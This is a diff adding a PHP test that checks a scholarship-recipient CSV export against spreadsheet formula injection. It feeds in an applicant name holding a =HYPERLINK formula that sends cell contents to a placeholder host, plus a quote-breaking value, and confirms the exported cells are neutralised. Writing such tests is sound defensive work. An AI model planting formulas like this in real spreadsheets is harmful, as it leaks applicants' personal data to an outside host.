@@ -164,6 +164,29 @@ describe('privasi', function () {
     });
 });
 
+describe('injeksi rumus', function () {
+    it('tidak membiarkan nama dari pendaftaran publik menjadi rumus lembar kerja', function () {
+        // The name is the applicant's own, typed on the public PMB portal.
+        $rumus = '=HYPERLINK("https://contoh.invalid/?d="&A2&B2,"Lihat")';
+        $pecah = 'x\\",=1+1';
+        penerimaKipk(atributMahasiswa: ['nama' => $rumus]);
+        penerimaKipk(atributMahasiswa: ['nama' => $pecah]);
+
+        $baris = collect(explode("\n", ltrim(isiUnduhan($this->kipk->csv($this->term)), "\xEF\xBB\xBF")))
+            ->filter()
+            ->map(fn (string $b) => str_getcsv($b, (string) config('bkd.ekspor.pemisah_csv'), '"', ''));
+
+        $nama = $baris->skip(1)->pluck(1)->all();
+
+        // Shown as text by the spreadsheet; the apostrophe is not displayed.
+        expect($nama)->toContain("'".$rumus)
+            // RFC 4180 quoting: the backslash does not end the field early, so
+            // no cell of the row starts with "=".
+            ->and($nama)->toContain($pecah)
+            ->and($baris->flatten()->filter(fn ($sel) => str_starts_with((string) $sel, '='))->all())->toBe([]);
+    });
+});
+
 describe('layar dan rute', function () {
     it('menyatakan sebabnya ketika skemanya belum ditetapkan', function () {
         config(['kipk.beasiswa_kode' => []]);
